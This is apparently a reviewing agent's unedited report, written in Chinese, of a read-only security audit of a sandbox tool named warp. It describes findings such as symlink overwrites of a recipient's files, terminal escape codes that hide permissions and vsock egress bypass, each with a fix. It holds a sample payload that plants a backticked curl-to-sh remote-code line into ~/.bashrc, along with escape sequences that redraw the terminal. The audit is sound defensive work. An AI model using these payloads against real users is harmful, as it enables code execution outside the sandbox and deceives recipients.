# 第二輪獨立審查 r1：沙箱、runner、netpolicy

這是審查代理的原始報告，未經修改。代理沒看過第一輪紀錄與其他代理的報告，只能讀碼、不能執行。各項發現經查證後的判定見 [11 交叉比對](../11-security-review-round2.md)；本報告中的嚴重度是代理自己的初判，可能與查證後不同。

## 摘要

這次只靠讀原始碼審查，沒有實際執行任何東西，重點範圍是 `internal/sandbox`、`internal/runner`、`internal/netpolicy`，另外看了相關的 `gate`、`report`、`label`、`watch`。沙箱本體寫得相當紮實：命名空間、pivot_root、清空 capability、no_new_privs、檔案描述元封閉、/proc 加固，以及「先解析、檢查位址、再直接連那個 IP」的對外閘門，我都沒找到可以直接利用的逃逸。

最嚴重的問題在沙箱外面。核心會在作者交付的應用目錄 `.warp/` 下寫檔，而寫入時會跟隨 symlink。惡意作者只要放一個 symlink，接收者執行 `warp label`（他們第一個會跑的指令），就會覆寫接收者的任意檔案，內容由作者控制，可以進一步造成殼外的程式碼執行。

另外三個較高的問題：
- 終端機標籤會原樣印出作者寫的字串，作者可以用終端控制碼把危險權限從畫面上藏起來。
- `warp evidence replay` 在接收者機器上執行作者的指令時，用的是沒經過檢查器的宣告。
- 沒有 seccomp，AF_VSOCK 這類不受網路命名空間管的 socket 可能繞過對外閘門。

## 發現

### [Critical] `.warp/` 內的 symlink 讓核心覆寫接收者的任意檔案，可延伸為殼外程式碼執行
- 位置：
  - `cmd/warp/main.go:353-354`（`label.json`）
  - `internal/report/report.go:105-114`（`reports/*.json`）
  - `internal/runner/runner.go:892-895`（`WriteEnforce`）
  - `internal/runner/probe.go:249`（`WriteProbe`）
  - `internal/manifest/util.go:136,156-162`（`.warp` 不納入內容雜湊）
- 違反的保證：「應用碰不到未宣告的檔案」，以及「作者交出去的只是一份宣告（資料），不是執法者」（T5 惡意作者）。
- 攻擊情境：
  1. 惡意作者在交付的應用目錄（git repo 或壓縮檔）裡放 `.warp/label.json -> ../../.bashrc`，或讓 `.warp/reports` 指向其他目錄。
  2. 接收者照流程執行 `warp label`、`warp enforce` 或 `warp probe`。
  3. 核心用 `os.MkdirAll` 加 `os.WriteFile` 寫入，兩者都跟隨 symlink，且會截斷原檔，結果以接收者身分覆寫目標檔。
  4. 寫入內容是 `json.MarshalIndent` 的輸出，其中 `purpose`、`app.entry`、`author_note` 等字串完全由作者控制。Go 的 JSON 只會跳脫 `< > &`，不會跳脫 `` ` ``、`$()`、`|`、`;`。例如 purpose 寫成 ``"`curl -s https://x.example/a|sh`"``，寫進 `~/.bashrc` 後會變成一行 `"purpose": "`curl …|sh`",`。bash 在查找指令前就先展開命令替換，所以接收者下次開 shell 時，程式碼會在殼外執行。
  - `label` 即使宣告有 lint 錯誤也照樣寫檔（`main.go:353`）。
  - `.warp` 不在 `ComputeDigest` 範圍內，所以這個 symlink 也不影響內容雜湊比對。
- 根因：把作者可控的 `.warp/` 當成核心自己的輸出目錄，沒有用 `O_NOFOLLOW` 或 `openat` 逐層檢查，也沒有檢查 `.warp` 和它的子目錄是不是 symlink、擁有者是誰。
- 修補建議：
  - 核心產生的檔案（標籤、報告）改寫到狀態目錄（`state.AppDir`）。
  - 如果一定要寫在 `.warp/`，用 `openat2(RESOLVE_NO_SYMLINKS|RESOLVE_BENEATH)` 或逐層 `O_NOFOLLOW|O_DIRECTORY`，先寫暫存檔再 rename，遇到 symlink 一律拒絕。
  - 同時在 lint 階段把 `.warp/` 裡的 symlink 列為硬性錯誤。
- 信心：高（覆寫行為可以直接從程式碼確認）。能否變成程式碼執行，取決於相對 symlink 能不能猜中目標路徑，例如應用被 clone 到家目錄下一層時 `../../.bashrc` 就成立。這點我沒有實際驗證。

### [High] 終端機標籤原樣印出作者控制的字串，可用終端控制碼藏掉危險權限
- 位置：
  - `internal/label/label.go:291-296`（purpose）、`282`（display name、version）、`321`（evidence 指令）、`359-361`（author note）
  - `internal/manifest/lint.go:142-148`（purpose 只檢查不是空白或佔位文字）
  - `internal/runner/replay.go:160,229`
- 違反的保證：「人只看標籤」；T5 的對策「要作惡就必須把惡意行為寫進標籤給人看」。
- 攻擊情境：
  1. 作者在 YAML 雙引號字串裡用 `\e` 跳脫寫入 ESC。yaml.v3 支援這個跳脫，lint 和 label 都沒有過濾控制字元。
  2. 例如把危險的授權（`app-visible` 機密、`lan: true`、萬用字元主機）排在前面，然後在 `author_note` 這個最後才印的欄位寫 `\e[14A\e[J` 再接一段偽造的乾淨標籤，就能把「需要你特別注意」整段，連同信任等級一起蓋掉重畫。
  3. 也可以用 `\e[8m` 隱藏後面的所有文字。
  - `label.json` 裡這些字元會被 JSON 跳脫，所以只有人看的終端機版本被騙，機器讀的版本是正常的。
- 根因：輸出到終端機前沒有清除 C0/C1 控制字元、ESC 和雙向文字覆寫字元（RLO 等）。
- 修補建議：lint 對所有會顯示的字串拒絕 `unicode.IsControl` 和 Bidi 控制字元；`Render` 與 `PrintReplay` 輸出前再統一跳脫一次（例如改成 `\x1b` 字面）。
- 信心：高（程式碼路徑明確）。實際能蓋掉多少行要看終端機，我沒有實際測試。

### [Medium] `warp evidence replay` 在接收者機器上執行作者的指令，但對外規則來自沒經過檢查器的宣告
- 位置：
  - `internal/runner/replay.go:88-99,167-169`
  - `internal/runner/runner.go:209-214`（record 模式只 `LoadFile`，不 lint）、`414-421`（`RecordOnly` 直接取自宣告）
  - `internal/gate/egress.go:171-185`
  - `internal/evidence/trace.go:256-263`
- 違反的保證：README 與文件 03 §6.5 說重放時「對外連線只允許宣告中的目的地」，暗示這些目的地是經過檢查器把關的。
- 攻擊情境：
  1. 惡意作者在 `warp.yaml` 宣告 `network.egress` 為 `*.com`、`*.io`（再配上 `lan: true`），或直接宣告內網 IP 加 `lan: true`。這些 lint 會擋或列為例外，但 `Replay` 完全不跑 lint，只比對 digest。
  2. 接收者執行 `warp evidence replay` 時，側錄檔裡由作者控制的指令就能連到任何 `.com` 主機。
  3. 配合 `lan: true`，作者控制的網域可以解析到接收者的內網位址（192.168.x.x 等），讓這段程式碼掃描或攻擊接收者的區域網路。
  4. 資源上限同樣來自沒檢查的宣告，可以設得極大。
- 根因：重放把「沒驗證的宣告」當成安全政策的來源。
- 修補建議：重放前先執行 `LoadAndLint`，有錯誤就拒絕；並且固定 `lan=false`、拒絕萬用字元（或要求它對應 lint 已核可的例外）。
- 信心：高。

### [Medium] 沒有 seccomp 過濾 socket 家族，AF_VSOCK 這類不受網路命名空間管的 socket 可能繞過對外閘門
- 位置：`internal/sandbox/shell_linux.go:73-80`、`internal/sandbox/init_linux.go:206-248`（只做 capability 和 no_new_privs，沒有 seccomp）
- 違反的保證：「殼內沒有直接的網路，唯一的出口是對外閘門」。
- 攻擊情境：殼內應用執行 `socket(AF_VSOCK, …)` 後 `connect` 到 CID 2（hypervisor 或主機），或是主機上其他 vsock 服務。在許多核心版本上，vsock 不受網路命名空間隔離，所以可以完全繞過只有 `lo` 的網路命名空間和閘門。在雲端或 Firecracker 類的 VM 上，這等於多了一條沒被記錄的對外通道。同一類問題還包括其他不受網路命名空間管的家族，以及 io_uring 等大量暴露給應用的核心介面。
- 根因：隔離只靠命名空間，沒有 socket 家族白名單。
- 修補建議：加上 seccomp-bpf，`socket()` 只放行 AF_UNIX、AF_INET、AF_INET6（必要時加 AF_NETLINK）；同時禁用 `io_uring_setup`、`userfaultfd`、`perf_event_open`、`bpf`、`keyctl` 等；可用時加上 Landlock。
- 信心：中。程式碼確實沒有任何 seccomp；但 vsock 是否受網路命名空間隔離取決於核心版本（較新的核心可能已加入 vsock netns 支援），也取決於主機有沒有 vsock 裝置。

### [Low] 對外閘門在核心這一側（殼外）沒有連線數上限，殼內應用可以耗盡主機記憶體
- 位置：`internal/gate/egress.go:109-121`（每個 accept 開一個 goroutine，沒有上限）、`268`、`298-313`（每條連線最多緩衝 1 MiB 標頭）
- 違反的保證：資源上限「整個殼」（cgroup）。閘門跑在殼外，不受殼的 cgroup 限制。
- 攻擊情境：應用開數萬條連線到 `127.0.0.1:3128`，每條慢慢送接近 1 MiB 的標頭，記憶體會累積在 warp 核心行程裡，不算在殼的記憶體額度內，最後拖垮主機。warp 沒有設定 `RLIMIT_NOFILE`，所以應用可以把軟上限調到主機的硬上限。
- 根因：閘門沒有每個殼的並行連線上限，也沒有總緩衝上限。
- 修補建議：用 semaphore 限制並行連線數（例如與 pids 上限成比例）、降低標頭上限，並為殼設定 `RLIMIT_NOFILE`。
- 信心：中（攻擊路徑成立，實際能吃掉多少記憶體沒有量測）。

### [Low] cgroup v2 只設定 `memory.max`，沒有設定 `memory.swap.max`
- 位置：`internal/sandbox/cgroup_linux.go:54-57`（v1 有設定 `memsw`，見 `:87`）
- 違反的保證：標籤上寫的「記憶體上限：整個殼」。
- 攻擊情境：在有 swap 的主機上，應用可以使用 `memory.max` 的實體記憶體加上沒有上限的 swap，總用量超出宣告。
- 修補建議：同時寫入 `memory.swap.max=0`（或對應的值），寫不進去就在報告中降級標示。
- 信心：高。

### [Low] USER_PICK 與應用根目錄的系統目錄檢查只比對完全相同的路徑，可以掛入含主機 socket 的子目錄
- 位置：`internal/runner/paths.go:56-60`（`p == d`）、`85-94`（只檢查最上層，而且只認容器 socket 的名稱）
- 違反的保證：「家目錄、`/run`、主機的 `/tmp` 都不存在於殼內」，以及不能透過 pick 掛入危險位置的承諾。
- 攻擊情境：惡意宣告用社交工程引導接收者 `--pick x=/run/user/1000`、`/tmp/.X11-unix` 或 `/dev/shm`。pathname 型的 unix socket 不受網路命名空間限制，應用可以連到 D-Bus session bus，再呼叫 `systemd --user` 的 `StartTransientUnit`，或連到 X11 注入鍵盤輸入，在殼外執行任意指令。
- 修補建議：系統目錄改用 `within` 前綴比對（至少 `/run`、`/proc`、`/sys`、`/dev`、`/tmp/.X11-unix`、`/var/run`）；遞迴拒絕任何含 socket 的目錄，或在掛載時加上 seccomp 或 Landlock 禁止 connect AF_UNIX pathname。
- 信心：中（前提是接收者自己選了這樣的路徑）。

### [Low] 作者附上的 `.warp/reports/*.json` 可以讓接收者的標籤直接顯示「L2 已驗證」
- 位置：`internal/label/label.go:199-224`
- 違反的保證：文件 05 §156 說「接收者則一律在自己的機器上重新探測」。但程式不會區分報告是不是在本機產生的；manifest 雜湊和 app digest 都可以公開算出，報告也沒有簽章。
- 攻擊情境：作者在 repo 裡放一份偽造的 `probe.json`（全部標成 blocked、`resources.scope=shell`）和 `enforce-last.json`。接收者執行 `warp label` 就會看到 L2，而且資源降級的 ⚠ 也會被藏掉。
- 修補建議：報告改存在狀態目錄並用本機 trace key 做 HMAC；`.warp/reports` 裡的報告一律視為沒驗證過。
- 信心：高（文件部分承認了「同一個使用者可偽造」，但沒有提到作者可以直接把偽造報告一起交付）。

### [Low] 側錄模式的 inotify 監看會跟隨 symlink（TOCTOU）
- 位置：`internal/watch/watch_linux.go:57-58,114-116`
- 攻擊情境：殼內應用 `mkdir x` 之後立刻用指向主機路徑的 symlink 換掉 `x`（殼內的絕對路徑在主機端解析時，會變成主機上的路徑，例如 `/home`）。核心收到 `IN_CREATE|IN_ISDIR` 後執行 `ReadDir` 和 `InotifyAddWatch`（沒有 `IN_DONT_FOLLOW`），就會遞迴監看主機目錄。結果是其他程序的檔名和存取活動被寫進側錄檔，造成證據污染和 inotify watch 耗盡。這個路徑在接收者端的 replay 也會執行到。
- 修補建議：加上 `IN_DONT_FOLLOW`，並用 `openat(O_NOFOLLOW|O_DIRECTORY)` 確認目標仍在根目錄內。
- 信心：低到中（競態窗口很小，影響以資訊外洩和證據可信度為主）。

### [Low] 防止明文 HTTP 送出機密的檢查只涵蓋 443 埠
- 位置：`internal/gate/egress.go:558-572`
- 攻擊情境：宣告的綁定主機另外列了 TLS 埠，例如 `api.x:8443`。應用改用 `http://api.x:8443/` 送請求，閘門照樣注入真正的金鑰，並以明文送出。
- 修補建議：機密綁定加上 scheme 或連接埠限制，預設只在 `https` 時注入。
- 信心：高（前提是宣告列了非 443 的 TLS 埠）。

### [Low] 對內閘門的權杖 cookie 可以被同機另一個殼內的應用蓋掉，也能對它發出盲目的 GET 請求
- 位置：`internal/gate/ingress.go:146-154`
- 攻擊情境：殼 A 的應用回應 `Set-Cookie: warp_token_<B 的埠>=x; Path=/`，就能覆寫使用者在殼 B 的權杖，讓 B 無法使用（DoS）。另外，`<img>` 這類 no-cors GET 不帶 Origin，而且同一主機的不同埠算同站，所以 A 的頁面可以帶著 B 的 cookie 對 B 發出盲目的 GET（類似 CSRF）。
- 修補建議：在回應路徑剝除應用設定的 `warp_token_*` cookie；GET 也檢查 `Sec-Fetch-Site`。
- 信心：中。

## 檢查過且認為沒問題的地方
- **控制 socket 與檔案描述元**：`cloexecInherited` 先把所有繼承的 fd 設成 close-on-exec；`ForkExec` 只傳 0、1、2；`selfFD` 帶 `O_CLOEXEC`；`recvMsg` 一次只收一個 fd，並且會拒絕被截斷的訊息。
- **環境變數**：init 的環境只有 `WARP_INTERNAL`，應用的環境從零組出來，只多帶 `TERM`；gate-only 機密只會以佔位值出現在殼內。
- **Capability 與特權**：清空邊界集、ambient 和三個 capability 集合，加上 no_new_privs，系統目錄都是 nosuid；以 root 執行時，execve 也拿不回 capability。
- **init 程序保護**：init 在啟動應用前設為不可 dump，應用無法 ptrace 它，也讀不到 `/proc/1/{environ,fd,exe}`。
- **巢狀命名空間**：`max_user_namespaces` 和 `max_net_namespaces` 設為 0 而且失敗即停止，應用沒有 capability 可以重新掛載。
- **/proc 加固**：`/proc/sys` 等以唯讀 bind 鎖住，`kcore`、`keys` 等被遮蔽，以 root 執行時也不能改主機的 sysctl。
- **合成檔案系統**：做完 pivot_root 後卸除舊根、根目錄 tmpfs 唯讀；`MS_PRIVATE` 遞迴設定，主機後續的掛載不會傳播進來；子掛載逐一重新掛成唯讀，失敗即停止。
- **掛載點解析時機**：在 pivot 之前，殼內 symlink 不會被核心解析成主機路徑；應用的 symlink 在殼內只會指向殼內的路徑。
- **終端機按鍵注入**：用 setsid 加上沒有控制終端，TIOCSTI 不能用；TIOCSCTTY 在終端機已屬於使用者 shell 的情況下也會失敗。
- **金鑰環**：在降權的執行緒上加入新的 session keyring，避免讀到主機 session keyring 的金鑰。
- **DNS rebinding**：解析後檢查**每一個**位址，再直接連那個 IP；`dialForTransport` 每次連線都重新判斷。
- **IP 字面值變形**：`0177.0.0.1`、`127.1`、十進位整數和帶 zone 的位址都會被 `netip` 或 `ValidHostname` 拒絕；`::ffff:`、`::/96`、NAT64、6to4、Teredo 都會先還原或歸類為保留位址。
- **中繼資料、本機名稱與主機自身位址**：都在連線前擋下；`lan: true` 也不會放行中繼資料或本機迴路位址。
- **重導向**：閘門用 `RoundTrip`，不會自動跟隨，機密不會被帶到別的主機。
- **SNI 與 Host 標頭**：不檢視內容的通道會比對 SNI，也會拒絕沒有 SNI 的 ClientHello；需要檢視內容的連線會比對 SNI 和每個請求的 Host 標頭。
- **閘門自己的代理設定**：transport 的 `Proxy: nil`，不會被環境變數導向別處。
- **回應中的機密**：回應遮蔽涵蓋標頭和串流內容，無法解開的內容編碼會整個擋下。
- **本機 CA**：私鑰只存在記憶體、每次執行重新產生；強制模式下帶 X.509 名稱限制。
- **對內閘門**：只監聽 127.0.0.1；權杖用常數時間比對；檢查 Host 和 Origin；會剝除其他殼的權杖 cookie。
- **cgroup 加入時機**：init 在加入 cgroup 之前只會等設定，不會 fork，沒有競態。
- **狀態目錄**：權限 0700、`trace.key` 拒絕 symlink 和寬鬆權限；`app.name` 經過字元清理，不會造成路徑穿越。
